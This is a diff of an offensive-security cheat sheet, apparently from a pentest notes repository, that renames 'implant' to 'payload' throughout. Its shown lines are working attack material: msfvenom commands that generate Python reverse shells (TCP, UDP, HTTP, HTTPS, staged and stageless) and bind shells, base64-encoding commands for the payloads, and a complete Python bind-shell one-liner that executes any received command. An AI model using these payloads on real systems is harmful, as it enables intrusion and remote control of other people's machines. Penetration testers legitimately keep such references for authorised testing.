@@ -12,76 +12,76 @@ tags:
 
 ## 01 - Base64 Encoded
 
-Encode the python implant.
+Encode the python payload.
 
 ```
-$ basenc -w 0 --base64 implant.py
+$ basenc -w 0 --base64 payload.py
 
-$ base64 -w 0 implant.py
+$ base64 -w 0 payload.py
 
-$ openssl enc -a -e -A -in implant.py
+$ openssl enc -a -e -A -in payload.py
 
-$ openssl enc -base64 -A -in implant.py
+$ openssl enc -base64 -A -in payload.py
 ```
 
-## 02 - Python Implants
+## 02 - Generate Payloads
 
 ### 2.1 - Cross Platform
 
-##### 2.1.1 - Generate via `msfvenom`
+##### 2.1.1 - Generate a payload via `msfvenom`
 
 ###### 2.1.1.1 - Reverse Shells
 
 Stageless TCP reverse shell.
 
 ```
-$ msfvenom -p python/shell_reverse_tcp lhost=<IP> lport=<PORT> -o shell.py
+$ msfvenom -p python/shell_reverse_tcp lhost=<IP> lport=<PORT> -o payload.py
 
-$ msfvenom -p python/shell_reverse_tcp_ssl lhost=<IP> lport=<PORT> -o shell.py
+$ msfvenom -p python/shell_reverse_tcp_ssl lhost=<IP> lport=<PORT> -o payload.py
 ```
 
 Stageless UDP reverse shell.
 
 ```
-$ msfvenom -p python/shell_reverse_udp lhost=<IP> lport=<PORT> -o shell.py
+$ msfvenom -p python/shell_reverse_udp lhost=<IP> lport=<PORT> -o payload.py
 ```
 
 Staged TCP reverse shell.
 
 ```
-$ msfvenom -p python/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -o implant.py
+$ msfvenom -p python/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -o payload.py
 
-$ msfvenom -p python/meterpreter/reverse_tcp_ssl lhost=<IP> lport=<PORT> -o implant.py
+$ msfvenom -p python/meterpreter/reverse_tcp_ssl lhost=<IP> lport=<PORT> -o payload.py
 ```
 
 Stageless HTTP reverse shell.
 
 ```
-$ msfvenom -p python/meterpreter_reverse_http lhost=<IP> lport=<PORT> -o implant.py
+$ msfvenom -p python/meterpreter_reverse_http lhost=<IP> lport=<PORT> -o payload.py
 ```
 
 Staged HTTP reverse shell.
 
 ```
-$ msfvenom -p python/meterpreter/reverse_http lhost=<IP> lport=<PORT> -o implant.py
+$ msfvenom -p python/meterpreter/reverse_http lhost=<IP> lport=<PORT> -o payload.py
 ```
 
 Stageless HTTP via TLS reverse shell.
 
 ```
-$ msfvenom -p python/meterpreter_reverse_https handlersslcert=[/path/to/file.pem] sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT> -o implant.py
+$ msfvenom -p python/meterpreter_reverse_https handlersslcert=[/path/to/file.pem] sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT> -o payload.py
 ```
 
 Staged HTTP via TLS reverse shell.
 
 ```
-$ msfvenom -p python/meterpreter/reverse_https handlersslcert=[/path/to/file.pem] sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT> -o implant.py
+$ msfvenom -p python/meterpreter/reverse_https handlersslcert=[/path/to/file.pem] sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT> -o payload.py
 ```
 
 ###### 2.1.1.2 - Bind Shells
 
 ```
-$ msfvenom -p python/shell_bind_tcp lport=<PORT> -o shell.py
+$ msfvenom -p python/shell_bind_tcp lport=<PORT> -o payload.py
 ```
 
 ##### 2.1.2 - One-liners
@@ -96,7 +96,7 @@ $ msfvenom -p python/shell_bind_tcp lport=<PORT> -o shell.py
 
 #### 2.2.1 - Reverse Shells
 
-##### 2.2.1.1 - Generate via `msfvenom`
+##### 2.2.1.1 - Generate a payload via `msfvenom`
 
 ```
 $ msfvenom -p cmd/unix/reverse_python lhost=<IP> lport=<PORT>
@@ -164,10 +164,10 @@ IPv4 bind shell one-liner.
 > py -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",51337));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
 ```
 
-## 03 - Execute Implant
+## 03 - Execute Payloads
 
 > [!TIP]
-> On windows, you can combine with a enumeration function to check one of the [[Compilers|compilers]] exist in order to execute the implant especially when the target is windows.
+> On windows, you can combine with a enumeration function to check one of the [[Compilers|compilers]] exist in order to execute the payload especially when the target is windows.
 
 ### 3.1 - Cross Platform
 
